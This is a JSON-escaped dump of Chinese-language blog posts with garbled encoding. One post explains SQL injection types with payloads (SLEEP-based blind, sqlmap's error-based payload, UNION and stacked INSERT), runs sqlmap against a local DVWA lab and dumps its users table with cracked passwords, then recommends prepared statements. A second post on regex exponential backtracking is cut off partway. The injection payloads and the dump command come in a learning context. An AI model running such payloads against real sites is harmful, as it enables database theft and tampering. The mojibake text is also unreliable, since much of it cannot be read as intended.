å¤±è´¥çš„æç¤ºã€‚é‚£ä¹ˆï¼Œæ—¶é—´å°±æˆäº†ä¸€ä¸ªæœ€å¥½çš„åˆ¤æ–­ã€‚æ¯•ç«Ÿæ˜¯é˜»å¡å¼çš„æ‰§è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eè¿˜æ˜¯ä»¥ \u003ccode\u003eSELECT * FROM users WHERE username = '${}'\u003c/code\u003e ä¸ºä¾‹ï¼Œä½¿ç”¨ç±»ä¼¼ \u003ccode\u003eadmin' AND IF(passwd LIKE '5%', SLEEP(5), 1);--\u003c/code\u003e çš„ PAYLOAD ï¼Œå½“æ»¡è¶³ \u003ccode\u003epasswd\u003c/code\u003e ä»¥ 5 å¼€å§‹æ—¶ï¼Œåˆ™ IF åˆ¤æ–­è¿›å…¥ \u003ccode\u003eSLEEP(5)\u003c/code\u003e ï¼Œæ ¹æ®ç½‘é¡µçš„å“åº”æ—¶é•¿å°±å¯ä»¥è¿›è¡Œç›¸åº”çš„åˆ¤æ–­ã€‚\u003c/p\u003e\n\u003ch3\u003eåŸºäºæŠ¥é”™çš„æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eè¿™åº”è¯¥ä¹Ÿç®—ä¸€ç§æ¯”è¾ƒå®¹æ˜“è‡ªåŠ¨åŒ–çš„æ³¨å…¥æ–¹å¼äº†ã€‚å…¶å®åœ¨çŒœè§£å­˜å‚¨å¯†ç å­—æ®µçš„å­—æ®µåæ—¶ï¼Œå‰é¢ä¹Ÿæ˜¯è¿™æ ·ç”¨çš„ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003e\u003e SELECT * FROM users WHERE password ='1';\nERROR 1054 (42S22): Unknown column 'password' in 'where clause'\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¦‚æœç¨‹åºä¸åšä»»ä½•å¤„ç†ï¼Œå¯¹ SQL é”™è¯¯ç›´æ¥æŠ›å‡ºï¼Œé‚£ä¹ˆï¼Œé€šè¿‡è¿™ä¸ªå°±èƒ½è·å¾—ç›¸å½“å¤šçš„ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cp\u003eç”±äºè¿™éƒ¨åˆ†æ¥è§¦ä¸æ·±ï¼Œä»…ä»…ç»™å‡º sqlmap æçš„ PAYLOAD\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eAND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¾ˆæ ‡å‡†çš„ PAYLOADï¼Œè€Œä¸”å®Œå…¨å¯ä»¥ã€‚\u003ccode\u003eINFORMATION_SCHEMA\u003c/code\u003e åº“çš„è¡¨å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯æŸ¥ï¼Œå› æ­¤ä¸å­˜åœ¨æˆæƒçš„é—®é¢˜ã€‚è€Œä¸”è¡¨ä¸­æ•°æ®è‡³å°‘å¤§äºç­‰äº 3 æ¡ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ª PAYLOAD ä¸€å®šå¯¼è‡´æŠ¥é”™çš„ä¸»å› ï¼Œå°±æ˜¯å¯¹ \u003ccode\u003eRAND()\u003c/code\u003e ä¸ \u003ccode\u003eGROUP BY\u003c/code\u003e çš„é…åˆåº”ç”¨ã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eUse of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. If the goal is to retrieve rows in random order, you can use a statement like this:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eè€ŒçœŸæ­£æƒ³è¦å¾—åˆ°çš„å†…å®¹ï¼Œé€šè¿‡ \u003ccode\u003eCONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x\u003c/code\u003e å¾—åˆ°ï¼Œ\u003ccode\u003e[QUERY]\u003c/code\u003e å°±æ˜¯çœŸæ­£æƒ³è¦æ³¨å…¥çš„å®Œæ•´SQLä¸²ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œè¿™é‡Œçš„ \u003ccode\u003eDELIMITER_START\u003c/code\u003e \u003ccode\u003eDELIMITER_STOP\u003c/code\u003e ä½œä¸ºç•Œå®šç¬¦ï¼Œå¸®åŠ©ç¨‹åºæå– \u003ccode\u003e[QUERY]\u003c/code\u003e å¾—åˆ°çš„ç»“æœã€‚å¦åˆ™ï¼Œç›´æ¥å¯¹è¯·æ±‚è¿”å›çš„ç»“æœè¿›è¡Œè¿‡æ»¤å¯çœŸæ˜¯å¤ªå›°éš¾äº†ã€‚\u003c/p\u003e\n\u003ch3\u003eè”åˆæŸ¥è¯¢æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eè”åˆæŸ¥è¯¢ï¼Œåº”è¯¥ç®—æ˜¯æœ€é¡¾åæ€ä¹‰çš„æ³¨å…¥æ–¹å¼ã€‚ä½¿ç”¨ \u003ccode\u003eUNION\u003c/code\u003e åœ¨åŸ SQL å·²ç»é™å®šäº†æŸ¥è¯¢è¡¨çš„å‰æä¸‹ï¼Œè·å¾—æ•°æ®åº“å…¶å®ƒåº“è¡¨çš„ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cp\u003eLIKE: \u003ccode\u003e1' UNION SELECT * FROM users;--\u003c/code\u003e è¿™æ ·çš„ PAYLOADã€‚\u003c/p\u003e\n\u003ch3\u003eå †æŸ¥è¯¢æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eæˆ‘æƒ³è¿™åº”è¯¥æ˜¯æœ€è®©äººæ‘¸ä¸ç€å¤´è„‘çš„å‘½åæ–¹å¼äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå½¢è±¡åŒ–çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨ PAYLOAD æ¥è¿›è¡Œè¯´æ˜ã€‚\u003ccode\u003e1'; INSERT INTO users (user, passwd) VALUES ('aaa', 'aaa');--\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eçœ‹èµ·æ¥å’Œ UNION æŒºåƒçš„å“ˆï¼Œéƒ½æ˜¯è¡¥å……ä¸Šä¸€ä¸ª OR å¤šä¸ª SQL ã€‚å½“ç„¶ï¼Œä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼Œå¦åˆ™ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·ä¸€ç§æŠ€æœ¯å‘¢ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€å¤§çš„åŒºåˆ«ï¼Œå°±æ˜¯å †æŸ¥è¯¢æ³¨å…¥èƒ½å¤Ÿå®Œæˆ \u003ccode\u003eUPDATE\u003c/code\u003e, \u003ccode\u003eINSERT\u003c/code\u003e, \u003ccode\u003eDELETE\u003c/code\u003e ç­‰æ“ä½œï¼Œæ¯•ç«Ÿï¼ŒUNION è”åˆçš„åªèƒ½æ˜¯ä½œä¸ºæŸ¥è¯¢äº†ï¼ˆå¯èƒ½è¯´æ³•ä¸å¤ªæ°å½“ï¼Œä½†å§‘ä¸”è¿™æ ·å§ï¼‰\u003c/p\u003e\n\u003ch3\u003eå¦ç±»æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eä¹‹å‰çš„å‡ ç§ï¼Œæˆ‘ä»¬éƒ½æ˜¯åˆ©ç”¨äº† \u003ccode\u003eSELECT\u003c/code\u003e å®Œæˆçš„æ³¨å…¥ï¼Œé‚£ä¹ˆå¯¹äº \u003ccode\u003eINSERT\u003c/code\u003e, \u003ccode\u003eUPDATE\u003c/code\u003e ä¹‹ç±»çš„è¯­å¥æ˜¯å¦æœ‰æ³¨å…¥çš„å¯èƒ½å‘¢ã€‚å½“ç„¶ä¹Ÿæ˜¯å­˜åœ¨å¯èƒ½çš„ã€‚\u003c/p\u003e\n\u003cp\u003eä¸è¿‡ï¼Œç²¾åŠ›æœ‰é™ï¼Œè€Œä¸”ç›®å‰çœ‹æ¥ä¹Ÿä¸éœ€è¦åšåˆ°è¿™ä¸€æ­¥ã€‚æš‚æ—¶æŒ–ä¸ªå‘å§ã€‚ä¸å¡«\u003c/p\u003e\n\u003ch2\u003eSQLMAP\u003c/h2\u003e\n\u003cp\u003eç®€å•çš„äº†è§£äº†å‡ ç§æ³¨å…¥åŸç†ä¹‹åï¼Œè¿˜æ˜¯è¦çœ‹çœ‹ SQL æ³¨å…¥ç¥å™¨çš„â€”â€”\u003ccode\u003eSQLMAP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eä¹Ÿç®—æ˜¯å°è¯•äº†å¥½ä¹…æ‰çœŸæ­£äº†è§£å®ƒçš„å¼ºå¤§ä¹‹å¤„ã€‚æ­¤å¤„å¼ºçƒˆæ¨è DVWAï¼Œ\u003ccode\u003eDamn Vulnerable Web Application\u003c/code\u003eï¼Œä¸€ä¸ªç”¨æ¥åˆæ³•æ”»å‡»çš„å·¥å…·ã€‚\u003c/p\u003e\n\u003cp\u003eéƒ¨ç½²æ–¹å¼ä¹Ÿæ˜¯å¼€ç®±å¯ç”¨ï¼Œåªè¦æœ‰ dockerï¼Œç›´æ¥ \u003ccode\u003edocker run --rm -it -p 80:80 vulnerables/web-dvwa\u003c/code\u003e å³å¯å®Œæˆéƒ¨ç½²ã€‚\u003c/p\u003e\n\u003cp\u003eå¯¹äºå°† DVWA å®‰å…¨çº§åˆ«è®¾ç½®ä¸º low æ—¶ï¼Œä»…ä»…åªéœ€è¦æ‰§è¡Œä¸‹åˆ—å‘½ä»¤å°±å¯ä»¥è·å–åˆ° DB é‡Œå‡ ä¹å®Œæ•´çš„ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003e$ sqlmap -u http://127.0.0.1/vulnerabilities/sqli/\\?id\\=1\\\u0026#x26;Submit\\=Submit\\# --cookie=\"PHPSESSID=jhton35qahj78l3unjea9k2lf7;security=low\" -v 3 --banner\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå½“ç„¶ï¼Œæ¢ä¸€ä¸‹ç›¸å…³è·å–çš„å†…å®¹ï¼Œä¾‹å¦‚æŠŠ \u003ccode\u003e--banner\u003c/code\u003e æ¢æˆ \u003ccode\u003e--dump\u003c/code\u003e ï¼Œæˆ‘ä»¬å€Ÿæ­¤æ¥ç®€å•çœ‹çœ‹ SQL æ³¨å…¥æ¼æ´çš„å¯æ€•ä¹‹å¤„\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sh\"\u003e[10:41:39] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N]\n[10:41:40] [INFO] starting dictionary-based cracking (md5_generic_passwd)\n[10:41:40] [INFO] starting 8 processes\n[10:41:42] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'\n[10:41:44] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'\n[10:41:47] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'\n[10:41:49] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'\n[10:41:53] [DEBUG] post-processing table dump\nDatabase: dvwa\nTable: users\n[5 entries]\n+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+\n| user_id | avatar                      | user    | password                                    | last_name | first_name | last_login          | failed_login |\n+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+\n| 1       | /hackable/users/admin.jpg   | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2018-12-15 00:42:31 | 0            |\n| 2       | /hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2018-12-15 00:42:31 | 0            |\n| 3       | /hackable/users/1337.jpg    | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2018-12-15 00:42:31 | 0            |\n| 4       | /hackable/users/pablo.jpg   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2018-12-15 00:42:31 | 0            |\n| 5       | /hackable/users/smithy.jpg  | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2018-12-15 00:42:31 | 0            |\n+---------+-----------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè¿™é‡Œå°±å¯ä»¥çœ‹åˆ° \u003ccode\u003edvwa.users\u003c/code\u003e è¡¨çš„å…¨éƒ¨å†…å®¹ï¼Œç”šè‡³è¿ç®€å•å¯†ç éƒ½å¸®ä½ å®Œæˆäº†çˆ†ç ´ã€‚\u003c/p\u003e\n\u003cp\u003eæ›´å¤šå†…å®¹å¯ä»¥è‡ªè¡Œå°è¯•ï¼Œè¯´çœŸçš„ï¼Œè¿™ä¸ªå·¥å…·ç›¸å½“å¼ºå¤§ã€‚å¦‚æœä»…ä»…è¯´æˆ‘é’ˆå¯¹æŸå‹æ•°æ®åº“(ä¾‹å¦‚ MySQL)å®Œæˆè¯¸å¦‚åŸºäºæŠ¥é”™çš„æ³¨å…¥ï¼Œåœ¨ä¸è€ƒè™‘é²æ£’æ€§çš„æƒ…å†µä¸‹ï¼Œå®Œå…¨å¯ä»¥åšåˆ°ã€‚ä½†æ˜¯æ”¯æŒè¶…10ä½™ç§æ•°æ®åº“ï¼Œä¸”è‡ªåŠ¨å®Œæˆæ³¨å…¥çš„å…¨è¿‡ç¨‹...\u003c/p\u003e\n\u003ch2\u003eé¢„ç¼–è¯‘ SQL\u003c/h2\u003e\n\u003cp\u003eæäº†è¿™ä¹ˆå¤šï¼Œç©¶ç«Ÿ SQL æ³¨å…¥å°±ä¸èƒ½å¤Ÿé¢„é˜²å—? å½“ç„¶å¯ä»¥ï¼Œä¸ç„¶æ•´ä¸ªç½‘ç»œç¯å¢ƒä¸‹çš„WEBåº”ç”¨ä¸å¾—éƒ½å®Œè›‹äº†ã€‚æœ‰é‡œåº•æŠ½è–ªçš„å¤„ç†æ–¹å¼å—ï¼Œä¹Ÿæœ‰ã€‚\u003c/p\u003e\n\u003cp\u003eé¢„ç¼–è¯‘ SQL å°±æ˜¯ä¸€ä¸ªè¶…çº§ OK çš„è§£å†³æ–¹æ¡ˆã€‚åŒæ—¶åœ¨ä½¿ç”¨ä¸Šä¹Ÿèƒ½å¤Ÿæ˜æ˜¾æå‡ DB æŸ¥è¯¢æ•ˆç‡\u003c/p\u003e\n\u003cp\u003eæˆ‘ç›¸ä¿¡é¢„ç¼–è¯‘ SQL å¾ˆå¤šäººå†™è¿‡ï¼Œæ¯•ç«Ÿå€ŸåŠ©ä¾‹å¦‚ MyBatis æ¡†æ¶ï¼Œèƒ½å¤Ÿå¿«é€Ÿå®ç° SQL é¢„ç¼–è¯‘è¯­å¥çš„ç¼–å†™ã€‚åŒæ—¶åœ¨æ±‚å­¦è¿‡ç¨‹ä¸­ä¼°è®¡ä¹Ÿéƒ½ç”¨è¿‡ Java åŸç”Ÿ JDBC çš„ \u003ccode\u003ePreparedStatement\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œä¸ MySQL äº¤äº’æ—¶çš„é¢„ç¼–è¯‘ SQL æ˜¯æ€ä¹ˆæ ·åœ°å¡«ä¸Šäº†å ä½ç¬¦å‘¢? å…ˆæ¥çœ‹çœ‹å†è¯´\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-sql\"\u003emysql\u003e prepare {name} from 'SELECT * FROM users WHERE user=? AND passwd=?'; # è¿™é‡Œçš„ {name} å¯ä»¥è‡ªå®šä¹‰å‘½åï¼Œæ— éœ€ {}\n\nmysql\u003e set @a='admin', @b='password';     # å£°æ˜å˜é‡ï¼Œå¹¶èµ‹å€¼\n\nmysql\u003e execute {name} using @a, @b;     # æä¾›å˜é‡å¹¶æ‰§è¡Œé¢„ç¼–è¯‘ SQL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæˆ‘æƒ³çœ‹åˆ°è¿™é‡Œåº”è¯¥å°±åº”è¯¥èƒ½å¤Ÿæ˜ç™½äº†å§ï¼ŒMySQL å¯¹äºé¢„ç¼–è¯‘ SQL çš„æ¯ä¸€ä¸ªå ä½ç¬¦ï¼Œéƒ½å·²ç»è®¤å®šäº†æ˜¯å•ä¸€çš„å…ƒç´ ï¼Œä¹Ÿå°±ä¸å¯èƒ½å­˜åœ¨å…è®¸æ‰“ç ´å·²æœ‰é¢„ç¼–è¯‘ç»“æœçš„å†…å®¹äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå³ä½¿çœŸçš„æ³¨å…¥äº† \u003ccode\u003eadmin OR 1=1\u003c/code\u003e ä¹‹ç±»çš„å†…å®¹ï¼Œä¹Ÿæ˜¯ä¼šè¢«è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ›¿ä»£ \u003ccode\u003euser\u003c/code\u003e å­—æ®µæˆ– \u003ccode\u003epasswd\u003c/code\u003e å­—æ®µï¼Œæ ¹æœ¬ä¸å¯èƒ½é‡æ–°æ‹†è§£ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e __                    __                  \n/ _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eè¯´å®è¯æ­¤å‰å¯¹ SQL æ³¨å…¥çš„ç†è§£ä»…ä»…åªæ˜¯çš®æ¯›ã€‚å½“ç„¶ï¼Œç›®å‰ä¹Ÿæ˜¯ï¼Œåªæ˜¯æœ‰äº†ä¸€å®šç¨‹åº¦çš„ç†è§£ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€è¿‘å¥½åƒå·¥å…·ç”¨å¾—æœ‰äº›è¿‡å¤´äº†ï¼Œéœ€è¦åœä¸‹æ¥æ•´ç†ä¸‹å·¥å…·çš„å®ç°åŸç†ã€‚\u003c/p\u003e\n\u003cp\u003eæ›´å¥½åœ°ç†è§£äº†å·¥å…·å®ç°ï¼Œæ‰èƒ½æ›´åŠ å¿ƒå®‰ç†å¾—åœ°ä½¿ç”¨å·¥å…·ã€‚æ¯•ç«Ÿç­‰åˆ«äººæ€¼çš„æ—¶å€™ï¼Œè¿˜èƒ½å¤Ÿæ¯”è¾ƒå®‰å¿ƒåœ°å›é“: \"æˆ‘ç”¨ä¸ç”¨ç°æˆçš„å·¥å…·åªæ˜¯å–å†³äºæˆ‘æƒ³ä¸æƒ³è‡ªå·±å†å†™ä¸€å¥—\"\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œæ¯•ç«Ÿæˆç†Ÿçš„å·¥å…·æœ‰æ›´å¤šçš„ä¼˜åŒ–ï¼Œè¿™å°±ä¸æ˜¯çŸ­æ—¶é—´å†…æˆ‘æƒ³ä¸æƒ³è‡ªå·±å†™çš„é—®é¢˜äº†ï¼Œå“ˆå“ˆã€‚\u003c/p\u003e"},{"url":"2018-11-16-regex-exponential-explosion","fileName":"2018-11-16-regex-exponential-explosion.md","title":"æ­£åˆ™è¡¨è¾¾å¼æŒ‡æ•°çˆ†ç‚¸","author":"fangfeng","date":"2018-11-16T00:00:00.000Z","tags":["regular expression","æŒ‡æ•°çˆ†ç‚¸"],"content":"\u003ch2\u003eèƒŒæ™¯\u003c/h2\u003e\n\u003cp\u003eæ˜¨å¤©æ¥è§¦åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜, å…¬å¸æµ‹è¯•ç¯å¢ƒä¸€å°æœºå™¨ CPU è·‘åˆ°äº† 400%ï¼Œå¯¼è‡´è¯¥æœºå™¨ä¸Šçš„æ‰€æœ‰æœåŠ¡éƒ½æŒ‚æ‰äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åæŸ¥åˆ°çš„åŸå› ç«Ÿç„¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ‰€å¼•èµ·çš„ï¼Œå¤§å¤§å‡ºä¹æ„æ–™å•Šã€‚è™½ç„¶æ—©å°±çŸ¥é“æ­£åˆ™æ•ˆç‡å¾ˆå·®ï¼Œä½†ç»å¯¹æ²¡æœ‰æƒ³åˆ°ä¼šå¯¼è‡´æ•´ä¸ªæœºå™¨ä¸ŠæœåŠ¡å´©æºƒçš„æƒ…å†µã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆç®€å•å±•ç¤ºä¸‹é—®é¢˜æ­£åˆ™:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-java\"\u003eString regex = \"(\\\\w+,?)+\";\nString val = \"abcdefghijklmno,abcdefghijklmno+\";\nSystem.out.println(val.matches(regex));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæœ€ç»ˆçš„æ‰§è¡Œæ—¶é—´æ˜¯ 17s å·¦å³ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸åï¼Œå¦‚æœæ”¹æˆ \u003ccode\u003eString val = \"abcdefghijklmno,abcdefghijklmno\"\u003c/code\u003e ï¼Œå®é™…æ‰§è¡Œæ—¶é—´ 1ms å·¦å³ã€‚\u003c/p\u003e\n\u003cp\u003eå“ˆå“ˆï¼Œå®Œå…¨ä¸æ˜¯ä¸€ä¸ªé‡çº§çš„ç»“æœã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åï¼Œå½“ç„¶æ˜¯è¦æ‰¾åŸå› äº†:\u0026#x3C; å½“ç„¶ï¼Œæœ‰å…¶å®ƒé‡è¦çš„äº‹åœ¨è€½æï¼Œæ²¡æ—¶é—´å»çœ‹ Java Regex æºç ã€‚ä¸è¿‡ï¼Œä»æ­£åˆ™æœ¬èº«ä¸‹æ‰‹åè€Œæ˜¯ä¸ªå¥½äº‹æƒ…ã€‚æ¯•ç«Ÿå‡ ä¹æ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€éƒ½æœ‰å¯¹æ­£åˆ™çš„æ”¯æŒã€‚è€ŒåŒæ ·çš„ï¼Œéƒ½å­˜åœ¨ç€è¿™æ ·çš„é—®é¢˜ã€‚é‚£å°±å¯ä»¥å¤§èƒ†çŒœæƒ³å…¶å®æ˜¯å’Œè¯­è¨€æœ¬èº«æ— å…³ï¼Œè€Œåœ¨äºæ­£åˆ™è§„èŒƒæœ¬èº«äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆç»™ä¸ªç»“æœï¼Œç½ªé­ç¥¸é¦–å°±æ˜¯\u003ccode\u003eæŒ‡æ•°çˆ†ç‚¸\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eè¿½æœ¬æº¯æº\u003c/h2\u003e\n\u003cp\u003eè¿™é‡Œå¹¶ä¸å‡†å¤‡ä¸€æ­¥ä¸€æ­¥åœ°é˜è¿°æ­£åˆ™çš„ï¼Œå¦‚æœçœŸçš„æ˜¯é›¶åŸºç¡€çš„è¯ï¼Œæ¨èå…ˆçœ‹ä¸€ä¸‹ \u003ca href=\"https://github.com/ziishaned/learn-regex/blob/master/README-cn.md\"\u003eå­¦ä¹ æ­£åˆ™\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eå°±äº‹è®ºäº‹ï¼Œè¿˜æ˜¯ä»¥ \u003ccode\u003eregex ::= (\\w+,?)+\u003c/code\u003e ä½œä¸ºç¤ºä¾‹æ¥è¿›è¡Œè¯´æ˜ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆéœ€è¦äº†è§£çš„æ˜¯ \u003ccode\u003eval.matches(regex)\u003c/code\u003e æ‰€è¦è¿›è¡Œçš„å·¥ä½œæ˜¯åˆ¤æ–­ \u003ccode\u003eval\u003c/code\u003e å…¨ä¸²æ˜¯å¦ç¬¦åˆ \u003ccode\u003eregex\u003c/code\u003e æ­£åˆ™æ¨¡å¼ã€‚è€Œæ­£åˆ™æ‰€è¦åšçš„å·¥ä½œå°±æ˜¯å°è¯•æ‰€æœ‰çš„åŒ¹é…å¯èƒ½æ€§(å½“ç„¶ï¼Œå¯¹äº \u003ccode\u003eval\u003c/code\u003e è¿™ä¸ªä¸²æ¥è¯´ï¼Œæœ€ååŒ¹é…åˆ° \u003ccode\u003eabcd..,abcd..mno+\u003c/code\u003e çš„ \u003ccode\u003e+\u003c/code\u003e çš„æ—¶å€™ä¸€å®šæ˜¯å¤±è´¥çš„ï¼Œå› ä¸º \u003ccode\u003eregex\u003c/code\u003e å¹¶ä¸åŒ¹é… \u003ccode\u003e+\u003c/code\u003e)\u003c/p\u003e\n\u003cp\u003eç®€å•æ‰©å±•ä¸€ä¸‹å¯¹\u003ccode\u003eå°è¯•æ‰€æœ‰åŒ¹é…å¯èƒ½æ€§\u003c/code\u003eè¿™å¥è¯çš„æè¿°:\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»¥ \u003ccode\u003e()\u003c/code\u003e å¯¹åº” \u003ccode\u003eregex\u003c/code\u003e ä¸­çš„ä¸€ç»„ \u003ccode\u003e(\\w+,?)\u003c/code\u003e ï¼Œè€Œæœ€åä¸€ä¸ª \u003ccode\u003e+\u003c/code\u003e è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ª(å³å…è®¸å­˜åœ¨å¤šä¸ª\u003ccode\u003e()\u003c/code\u003e)\u003c/p\u003e\n\u003cp\u003eå¯¹ \u003ccode\u003eval\u003c/code\u003e ä¸²çš„åŒ¹é…å¯èƒ½æ€§æœ‰\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e(abcdefghijklmno,)(abcdefghijklmno)+\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e(abcd)(efghijklmno,)(abcdefghijklmno)+\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e(abcdefghijklmno,)(abcdef)(ghijklmno)+\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e(abc)(defghijklmno,)(abcde)(fg)(hijklmno)+\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e...\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæœ‰ç›¸å½“å¤šçš„åŒ¹é…å¯èƒ½ï¼Œä¸å†ä¸€ä¸€è¯¦è¿°(äº‹å®ä¸Šï¼Œå…‰é ä¸ªäººæ‰‹å·¥æ ¹æœ¬åˆ—ä¸¾ä¸å®Œã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆåˆ°åº•ä¼šæœ‰å¤šå°‘ä¸­åŒ¹é…å¯èƒ½æ€§å‘¢?\u003c/p\u003e\n\u003cp\u003eä¸‹é¢æˆ‘ä»¬å°±æ¥ç®€å•è®¡ç®—ä¸€ä¸‹:\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œæˆ‘ä»¬æŠŠ \u003ccode\u003e(\\w+,?)+\u003c/code\u003e è¿™ä¸ªæ­£åˆ™æ‰©å±•ä¸€ä¸‹ï¼Œå®ƒä¸ä¸‹åˆ—è¿™äº›ä¸²éƒ½æ˜¯ç­‰ä»·çš„ \u003ccode\u003e(\\w+,|\\w+)+\u003c/code\u003e, \u003ccode\u003e(\\w+,)?(\\w+)?(\\w+,?)+\u003c/code\u003e, \u003ccode\u003e(\\w+,)?(\\w+)?(\\w+)?(\\w+,?)+\u003c/code\u003e ...\u003c/p\u003e\n\u003cp\u003eä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡³å°‘æŠŠ \u003ccode\u003eabcdefghijklmno,abcdefghijklmno+\u003c/code\u003e æŒ‰ç…§åŒ¹é…ä¸²åˆ’åˆ†å‡º1ç»„ï¼Œ2ç»„ï¼Œ3ç»„...30ç»„(å› ä¸ºæ¯ä¸ªç»„è‡³å°‘éœ€è¦ä¸€ä¸ª\u003ccode\u003e\\w\u003c/code\u003e )\u003c/p\u003e\n\u003cp\u003eä¸è¿‡è¿™ä¸ªæŒ‰ç…§1ç»„ï¼Œ2ç»„...å»è®¡ç®—å¯èƒ½æ€§çš„è¯å®åœ¨æ˜¯è´¹åŠ›ä¸è®¨å¥½çš„äº‹æƒ…ã€‚ç”¨ç»„åˆæ•°å­¦æ¥è€ƒè™‘è¿™ä¸ªé—®é¢˜\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œæ•´ä¸ª \u003ccode\u003eabcdefghijklmno,abcdefghijklmno+\u003c/code\u003e çš„å¼€å§‹åº”è¯¥æœ‰ä¸€ä¸ªå·¦æ‹¬å· \u003ccode\u003e(\u003c/code\u003eï¼Œå³ \u003ccode\u003e(abcdefghijklmno,abcdefghijklmno+\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå…¶æ¬¡ï¼Œåˆ° \u003ccode\u003e,\u003c/code\u003e ä¸ºæ­¢è‡³å°‘åº”è¯¥æœ‰ä¸€ä¸ªå³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003eï¼Œå³ 